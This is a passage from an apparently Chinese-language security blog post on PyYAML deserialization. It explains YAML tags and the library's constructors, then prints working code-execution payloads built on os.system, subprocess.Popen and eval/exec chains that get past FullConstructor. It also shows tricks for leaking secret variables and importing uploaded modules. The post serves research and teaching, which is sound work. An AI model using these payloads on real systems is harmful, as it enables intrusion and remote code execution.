class="hljs-string"></span><br><span class="hljs-string">string_0:</span><br><span class="hljs-string">    - macr0phag3</span><br><span class="hljs-string">    - &quot;I&#x27;m Tr0y&quot;  # 可以使用双引号或者单引号包裹特殊字符</span><br><span class="hljs-string">    - &quot;I am fine. \u263A&quot; # 使用双引号包裹时支持 Unicode 编码</span><br><span class="hljs-string">    - &quot;\\x0d\\x0a is \\r\\n&quot; # 使用双引号包裹时还支持 Hex 编码</span><br><span class="hljs-string">    - newline</span><br><span class="hljs-string">      newline2  # 字符串可以拆成多行，每行之间用空格隔开</span><br><span class="hljs-string"></span><br><span class="hljs-string"># &gt; 可以在字符串中折叠换行</span><br><span class="hljs-string">string_1: &gt;</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string"># | 保留换行符</span><br><span class="hljs-string">string_2: |</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string"># | 保留换行符，且去掉最后一个换行符</span><br><span class="hljs-string">string_3: |-</span><br><span class="hljs-string">    newline</span><br><span class="hljs-string">    newline2</span><br><span class="hljs-string"></span><br><span class="hljs-string">list: &amp;id_1</span><br><span class="hljs-string">- 18  # 定义锚点</span><br><span class="hljs-string">- cm</span><br><span class="hljs-string"></span><br><span class="hljs-string">two_dimensional_list:</span><br><span class="hljs-string">-</span><br><span class="hljs-string">    - Macr0phag3</span><br><span class="hljs-string">    - Tr0y</span><br><span class="hljs-string"></span><br><span class="hljs-string">boolean: </span><br><span class="hljs-string">    - TRUE  # true、True、Yes、YES、yes、ON、on、On 都可以</span><br><span class="hljs-string">    - FALSE  # false、False、NO、no、No、off、OFF、Off 都可以</span><br><span class="hljs-string"></span><br><span class="hljs-string">float:</span><br><span class="hljs-string">    - 3.14</span><br><span class="hljs-string">    - 6.8523015e+5  # 可以使用科学计数法</span><br><span class="hljs-string"></span><br><span class="hljs-string">int:</span><br><span class="hljs-string">    - 123</span><br><span class="hljs-string">    - 0b10100111010010101110  # 支持二进制表示</span><br><span class="hljs-string">    - 0x0a  # 支持十六进制表示</span><br><span class="hljs-string"></span><br><span class="hljs-string">nulls:</span><br><span class="hljs-string">  - null  # NULL 也 ok</span><br><span class="hljs-string">  - Null</span><br><span class="hljs-string">  - ~</span><br><span class="hljs-string">  -</span><br><span class="hljs-string"></span><br><span class="hljs-string">date:</span><br><span class="hljs-string">    - 2018-02-17  # 日期必须使用 ISO 8601 格式，即 yyyy-MM-dd</span><br><span class="hljs-string"></span><br><span class="hljs-string">datetime: </span><br><span class="hljs-string">    -  2018-02-17T15:02:31+08:00  # 时间使用 ISO 8601 格式，时间和日期之间使用 T 连接，最后使用 + 代表时区</span><br><span class="hljs-string"></span><br><span class="hljs-string"># &gt; 可以在字符串中折叠换行</span><br><span class="hljs-string">object: &amp;id_2</span><br><span class="hljs-string">    name: Tr0y</span><br><span class="hljs-string">    money: 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">json: [&#123;1: Macr0phag3, 2: Tr0y&#125;, &quot;???&quot;]  # 值支持 json</span><br><span class="hljs-string"></span><br><span class="hljs-string">reference: </span><br><span class="hljs-string">    size: *id_1</span><br><span class="hljs-string">    &lt;&lt;: *id_2</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>结果如下：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8d42331c-e3bd-4620-af91-f6c797f8117e.png!blog" /></p><p><del>（内含彩蛋）</del></p><p>对于 PyYAML 的使用，请移步官方文档：</p><p>https://pyyaml.org/wiki/PyYAMLDocumentation</p><h2 id="类型转换">类型转换</h2><p>上面还差一个重要的语法没讲：可以通过 <code>!!</code> 来进行类型转换。</p><p>通过上面的测试可以发现，如果识别到一个数字，那么按照 YAML 格式来处理，这个类型就是数字类型。如果我们想把数字类型变为字符串类型就可以这样：<code>a: !!str 1</code>，它的结果和 <code>a: "1"</code> 是一样的。</p><p>由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 <code>!!</code> 来扩展额外的解析能力。本文主要聚焦于 PyYAML，所以直接看源码就可以知道它在 <code>!!</code> 上做了哪些魔改。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/8dbaf2fa-14ae-4c61-aac4-af1c0a04fd5c.png!blog" /></p><h3 id="理解基础的类型转换">理解基础的类型转换</h3><p>在 <code>site-packages/yaml/constructor.py</code> 中可以看到使用了 <code>add_constructor</code> 的有 24 多个地方，这些都是用来支持基础的类型转换（带有 <code>tag:yaml.org,2002:python/</code> 的说明是 PyYAML 自定义的类型转换），这些基础类型转换的功能非常好理解，看上面那张图即可，就不多说了，来看下它是怎么实现的吧。</p><p>以 <code>!!binary</code> 这个为例，对应的函数是 <code>construct_yaml_binary</code>，下个断点可以看到，传入的参数 node 格式为：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">ScalarNode(<br>  tag=<span class="hljs-string">&#x27;tag:yaml.org,2002:binary&#x27;</span>,<br>  value=<span class="hljs-string">&#x27;R0lGODlhDAAMAIQAAP//9/X\n17unp5WZmZgAAAOfn515eXv\nPz7Y6OjuDg4J+fn5OTk6enp\n56enmleECcgggoBADs=mZmE&#x27;</span><br>)<br></code></pre></td></tr></table></figure><br />所以对于一个 <code>!!x x</code> 来说，类型转换执行的伪代码就是：<code>find_function("x")(x)</code>。这个也很好理解。</p><h3 id="高级类型转换">高级类型转换</h3><p>在理解了基础的类型转换之后，查看源码可以发现还有一个 <code>add_multi_constructor</code> 函数，一共有 5 个：</p><ul><li><code>python/name</code></li><li><code>python/module</code></li><li><code>python/object</code></li><li><code>python/object/new</code></li><li><code>python/object/apply</code></li></ul><p>从上面那张图可以看到，这几个都可以引入新的模块。这就是 PyYAML 存在反序列化的本质原因。</p><h2 id="攻击思路">攻击思路</h2><p>截止目前（2022），PyYAML 的利用划分以版本 5.1 为界限，&lt;5.1 版本的利用非常简单，就先介绍一下；&gt;5.1 的利用很相似，但需要稍微做一些解释，所以放在后面。</p><p>下面按照利用难度从易到难排列。</p><h3 id="版本小于-5.1">版本小于 5.1</h3><p>下面以 <code>4.2b4</code> 为例。</p><h4 id="关键方法">关键方法</h4><p>&lt;5.1 版本中提供了几个方法用于解析 YAML：</p><ol type="1"><li><code>yaml.load</code>：加载单个 YAML 配置</li><li><code>yaml.load_all</code>：加载多个 YAML 配置</li></ol><p>以上这两种均可以通过 <code>Loader</code> 参数来指定加载器。一共有三个加载器，加载器后面对应了三个不同的构造器：</p><ol type="1"><li><code>BaseConstructor</code>：最最基础的构造器，不支持强制类型转换</li><li><code>SafeConstructor</code>：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改</li><li><code>Constructor</code>：在 YAML 规范上新增了很多强制类型转换</li></ol><p><code>Constructor</code> 这个是最危险的构造器，却是默认使用的构造器。</p><h4 id="pythonobjectapply">python/object/apply</h4><p>对应的函数是 <code>construct_python_object_apply</code>，最终在 <code>make_python_instance</code> 中引入了模块中的方法并执行。</p><p><code>python/object/apply</code> 要求参数必须用一个列表的形式提供，所以以下 payload 都是等价的，但是写法不一样，可以用来绕过：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&#x27;exp: !!python/object/apply:os.system [&quot;whoami&quot;]&#x27;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [&#x27;whoami&#x27;]&quot;</span>)<br><br><span class="hljs-comment"># 引号当然不是必须的</span><br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [whoami]&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  args: [&quot;whoami&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># command 是 os.system 的参数名</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]: exp&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p><h4 id="pythonobjectnew">python/object/new</h4><p>对应的函数是 <code>construct_python_object_new</code>，这个函数仅有一行，就是调用 <code>construct_python_object_apply</code>，他们两个链路的区别在于调用 <code>make_python_instance</code> 时 <code>newobj</code> 参数不同。</p><p>而仔细观察 <code>make_python_instance</code> 中的 <code>if newobj and isinstance(cls, type)</code> 条件基本上都会满足（有例外，后面那个条件有点特殊的地方，下面会细说）。所以 <code>python/object/new</code> 和 <code>python/object/apply</code> 可以视为是完全等价的，那么它们的 payload 就是一样的，参考上面即可。</p><h4 id="pythonobject">python/object</h4><p>对应的函数是 <code>construct_python_object</code>，非常简单，先 <code>make_python_instance</code> 了一下，然后执行了 <code>set_python_instance_state</code>。根据上面的经验，只要走到 <code>make_python_instance</code> 就可以触发调用。但问题是这里没法传参，所以只能执行无参函数：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e46d6374-5b1d-496b-8226-9ae96eae7205.png!blog" /></p><p>有趣的是，这种利用方式会报错：<code>TypeError: can't set attributes of built-in/extension type 'object'</code>，通过分析代码可知，流程是走到了 <code>setattr(object, key, value)</code> 报错的：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/e69c4ea6-e8bd-4fce-b8c2-1dcd202b9eeb.png!blog" /></p><p>这个是必然的，object 这种内置的类，都是在底层的 C 代码中写死的，官方不允许对它们随便设置属性的。这里顺便说一句，通过 gc 引用是可以修改的：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/bc3913c2-af44-4094-8f66-7b122787151d.png!blog" /></p><p>当然这个不是本文重点。</p><p>所以这很明显是一个 bug，因为这个流程既然存在就必定会走到，而现在一旦走到就必然报错。查了下 issue，发现在 18 年的时候就已经发现了：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/c4647a3e-2d2b-4604-8113-6fc798175a93.png!blog" /></p><p>的确，应该是 <code>setattr(instance, key, value)</code>。这个 bug 在 5.3 已修复了。</p><h4 id="pythonmodule">python/module</h4><p>对应的函数是 <code>construct_python_module</code>，里面调用了 <code>find_python_module</code>，等价于 <code>import</code>。</p><p>那么在这种没有调用逻辑的情况下，是否有办法利用呢？我感觉在可以写任意文件的时候是有办法的。比如搭配任意文件上传。</p><p>首先写入执行目录，yaml 中指定同名模块，例如上传一段恶意代码，叫 <code>exp.py</code>，然后通过 <code>yaml.load('!!python/module:exp')</code> 加载。</p><p>在实际的场景中，由于一般用于存放上传文件的目录和执行目录并不是同一个，例如：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">app.py<br>uploads<br>  <span class="hljs-string">|_ user.png</span><br>  <span class="hljs-string">|_ header.jpg</span><br></code></pre></td></tr></table></figure><p>这个时候只需要上传一个 .py 文件，这个文件会被放在 uploads 下，这时只需要触发 <code>import uploads.header</code> 就可以利用了：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/a2aa2bd6-27cc-4d0c-aa6a-4b894ae35514.png!blog#width-zoom6" /></p><p>更简单的，直接上传 <code>__init__.py</code>，在触发的时候用 <code>!!python/module:uploads</code> 就可以了。</p><h4 id="pythonname">python/name</h4><p>对应的函数是 <code>construct_python_name</code>，里面调用了 <code>find_python_name</code>，与 <code>python/module</code> 的逻辑极其类似，区别在于，<code>python/module</code> 仅仅返回模块而 <code>python/name</code> 返回的是模块下面的属性/方法。</p><p>利用的逻辑除了上面一样之外，还可以用于这种场景：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml<br><br><br>TOKEN = <span class="hljs-string">&quot;Y0u_Nev3r_kn0w.&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">config</span>):<br>    <span class="hljs-keyword">try</span>:<br>        token = yaml.load(config).get(<span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        token = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> token == TOKEN:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;yes, master.&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;fuck off!&quot;</span>)<br><br><br>config = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 可控输入点</span><br>check(config)<br></code></pre></td></tr></table></figure><p>这个时候的 payload 为 <code>token: !!python/name:__main__.TOKEN</code>，无需知道 TOKEN 是什么，但是需要知道变量名。</p><p>当然，这个场景除了 <code>!!python/module</code> 无法完成利用之外，上述其他姿势都可以实现。</p><h3 id="版本大于等于-5.1">版本大于等于 5.1</h3><p>由于默认的构造器太过强大，开发人员不了解这些危险很容易中招。所以 PyYAML 的开发者就将构造器分为：</p><ol type="1"><li><code>BaseConstructor</code>：没有任何强制类型转换</li><li><code>SafeConstructor</code>：只有基础类型的强制类型转换</li><li><code>FullConstructor</code>：除了 <code>python/object/apply</code> 之外都支持，但是加载的模块必须位于 <code>sys.modules</code> 中（说明已经主动 import 过了才让加载）。这个是默认的构造器。</li><li><code>UnsafeConstructor</code>：支持全部的强制类型转换</li><li><code>Constructor</code>：等同于 <code>UnsafeConstructor</code></li></ol><p>对应顶层的方法新增了：</p><ol type="1"><li><code>yaml.full_load</code></li><li><code>yaml.full_load_all</code></li><li><code>yaml.unsafe_load</code></li><li><code>yaml.unsafe_load_all</code></li></ol><p>通常情况下，我们还是会使用 <code>yaml.load</code>，这个时候会有 warning：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/74750255-05b5-44fe-89fa-56f84fff1b78.png!blog" /></p><p>因为在不指定 <code>Loader</code> 的时候，默认是 <code>FullConstructor</code> 构造器。这对开发人员起到了提醒的作用。</p><p>除此之外，在 <code>make_python_instance</code> 还新增的额外的限制：<code>if not (unsafe or isinstance(cls, type))</code>，也就是说，在安全模式下，加载进来的 <code>module.name</code> 必须是一个类（例如 <code>int</code>、<code>str</code> 之类的），否则就会报错。</p><h3 id="常规利用方式">常规利用方式</h3><p>常规的利用方式和 &lt;5.1 版本的姿势是一样的。当然前提是构造器必须用的是 <code>UnsafeConstructor</code> 或者 <code>Constructor</code>，也就是这种情况：</p><ol type="1"><li><code>yaml.unsafe_load(exp)</code></li><li><code>yaml.unsafe_load_all(exp)</code></li><li><code>yaml.load(exp, Loader=UnsafeLoader)</code></li><li><code>yaml.load(exp, Loader=Loader)</code></li><li><code>yaml.load_all(exp, Loader=UnsafeLoader)</code></li><li><code>yaml.load_all(exp, Loader=Loader)</code></li></ol><p>直接打就好了。</p><h3 id="突破-fullconstructor">突破 FullConstructor</h3><p>FullConstructor 中，限制了只允许加载 <code>sys.modules</code> 中的模块。这个有办法突破吗？我们先列举一下限制：</p><ol type="1"><li>只引用，不执行的限制：<ol type="1"><li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li></ol></li><li>引用并执行：<ol type="1"><li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li><li>FullConstructor 下，<code>unsafe = False</code>，加载进来的 <code>module.name</code> 必须是一个类</li></ol></li></ol><p>举两个不行的例子：</p><ol type="1"><li><code>!!python/name:pickle.loads</code>：<code>pickle</code> 不在 <code>sys.modules</code> 中</li><li><code>!!python/object/new:builtins.eval ["print(1)"]</code>：<code>eval</code> 虽然在 <code>sys.modules</code> 中，但是 <code>type(builtins.eval)</code> 是 <code>builtin_function_or_method</code> 而不是一个类。</li></ol><p>那么最直接的思路就是，有没有一个模块，它在 FullConstructor 上下文中的 <code>sys.modules</code> 里，同时它还有一个类，这个类可以执行命令？答案就是 <code>subprocess.Popen</code>。所以最简单的 payload 就是：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:subprocess.Popen</span><br><span class="hljs-string">  - whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>不用 <code>!!python/object/apply</code> 的话，也有其他办法。</p><p>通过遍历 builtins 下的所有方法，可以找到这些看起来有点用的：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">bool</span>、<span class="hljs-built_in">bytearray</span>、<span class="hljs-built_in">bytes</span><br><span class="hljs-built_in">complex</span><br><span class="hljs-built_in">dict</span><br><span class="hljs-built_in">enumerate</span><br><span class="hljs-built_in">filter</span>、<span class="hljs-built_in">float</span>、<span class="hljs-built_in">frozenset</span><br><span class="hljs-built_in">int</span><br><span class="hljs-built_in">list</span><br><span class="hljs-built_in">map</span>、<span class="hljs-built_in">memoryview</span><br><span class="hljs-built_in">object</span><br><span class="hljs-built_in">range</span>、<span class="hljs-built_in">reversed</span><br><span class="hljs-built_in">set</span>、<span class="hljs-built_in">slice</span>、<span class="hljs-built_in">str</span>、<span class="hljs-built_in">staticmethod</span><br><span class="hljs-built_in">tuple</span><br><span class="hljs-built_in">zip</span><br></code></pre></td></tr></table></figure></p><p>其中，<code>map</code> 是可以用来触发函数执行的，那么函数怎么引用进来呢？很明显就是 <code>python/name</code>，所以这个 payload 的原型就可以是：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br></code></pre></td></tr></table></figure></p><p>翻译为 YAML 即为：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:tuple</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>这里有个非常有趣的地方，如果把 <code>tuple</code> 换成 <code>list</code> 或者是 <code>set</code>，理论上同样会解开 map 里的内容：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/342671db-24bb-431c-9a4e-2ce809fc71b6.png!blog" /></p><p>但是通过 <code>!!python/object/new</code> 来使用时却会忽略参数，生成一个空的迭代对象：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/dae3bf71-db1c-4962-aea3-195cbc1f5dd8.png!blog#width-zoom5" /></p><p>可以看到，上面并没有执行命令（只要尝试解开 payload 里的 map 必定会执行命令）。跟踪执行流程并审计源码可以发现，在 <code>make_python_instance</code> 中，这也是为什么我上面说这个条件比较特殊。</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/d8f60d96-f82d-4b91-9b12-735abbbc475b.png!blog" /></p><p>可以看到，这里是通过 <code>cls.__new__</code> 来新建一个 cls 实例的，因为 FullConstructor 下使用 <code>python/object/new</code> 时，newobj 必定是 <code>True</code>，而后面那个条件必定是满足的，否则上面一个条件就会报错。</p><p>所以到这里我们就可以复现这个 “bug”：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/58f754f0-a23c-4913-a8dc-ee57f64f3ebc.png!blog" /></p><p>那么为什么通过 <code>list.__new__</code> 会忽略元素参数，而 <code>tuple.__new__</code> 却不会呢？</p><p>通过审计 Python 的 C 代码，对比 list 和 tuple 的底层实现，大致可以得出这么一个结论：由于 <code>__new__</code> 的调用在 <code>__init__</code> 之前，所以我猜测不可变类型是在 <code>__new__</code> 时插入元素，而可变类型是在 <code>__init__</code> 时插入元素，所以 <code>__new__</code> 时传入的元素参数就被忽略了，而 <code>__init__</code> 又没有接收到元素，所以就生成了一个空的实例。<strong>注意，这个结论由于精力原因，并没有经过严格的考证，若感兴趣橘友们应当自行跟踪调试。</strong></p><p>所以 <code>frozenset</code>、<code>bytes</code> 等这种不可变类型都会解开里面的元素从而触发命令执行，而 <code>dict</code>、<code>bytearray</code> 等这种可变类型就不会：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/70d23eee-bddc-4ab3-a0a5-a7acfe5932c2.png!blog" /></p><p>所以，我们只需要找到 触发带参调用 + 引入函数 这两个点就可以完成攻击。在 <code>construct_python_object_apply</code> 中，不仅进行了实例化，如果有 <code>listitems</code> 还会调用实例的 <code>extend</code> 方法，所以原型是：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;exp&quot;</span>, (), &#123;<span class="hljs-string">&quot;extend&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>exp.extend(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>YAML payload:<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - exp</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="hljs-string">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>结果：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-pyyaml/11e9e1a9-eb9c-4cbf-a5b7-b18feef4e286.png!blog#width-zoom7" /></p><p><code>construct_python_object_apply</code> 中还对实例进行 setstate，即调用了 <code>__setstate__</code>，所以同样的思路，原型：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;exp&quot;</span>, (<span class="hljs-built_in">list</span>, ), &#123;<span class="hljs-string">&quot;__setstate__&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>exp.__setstate__(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>YAML payload:<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - exp</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;__setstate__&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>这里的 <code>type</code> 也可以用 <code>staticmethod</code> 来替换。例如，在 <code>set_python_instance_state</code> 中，还有个调用 <code>slotstate.update</code> 的逻辑，那么只要将 <code>slotstate.update</code> 置为 <code>eval</code>，<code>state</code> 就是 RCE 的 payload。原型：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">staticmethod</span>([<span class="hljs-number">0</span>])<br>exp.__dict__.update(<br>    &#123;<span class="hljs-string">&quot;update&quot;</span>: <span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;items&quot;</span>: <span class="hljs-built_in">list</span>&#125;<br>)<br>exp_raise = <span class="hljs-built_in">str</span>()<br><span class="hljs-comment"># 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用</span><br><br>exp.update(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>YAML payload:<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:str</span><br><span class="hljs-string">    args: []</span><br><span class="hljs-string">    # 通过 state 触发调用</span><br><span class="hljs-string">    state: !!python/tuple</span><br><span class="hljs-string">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">      # 下面构造 exp</span><br><span class="hljs-string">      - !!python/object/new:staticmethod</span><br><span class="hljs-string">        args: []</span><br><span class="hljs-string">        state: </span><br><span class="hljs-string">          update: !!python/name:eval</span><br><span class="hljs-string">          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>这个稍微复杂一些。</p><p>总之这个组合拳用来绕过 FullConstructor 是很简单的。</p><h3 id="版本大于等于-5.2">版本大于等于 5.2</h3><p>FullConstructor 现在只额外支持 <code>!!python/name</code>、<code>!!python/object</code>、<code>!!python/object/new</code> 和 <code>!!python/module</code>，<code>!!python/object/apply</code> G 了。</p><h3 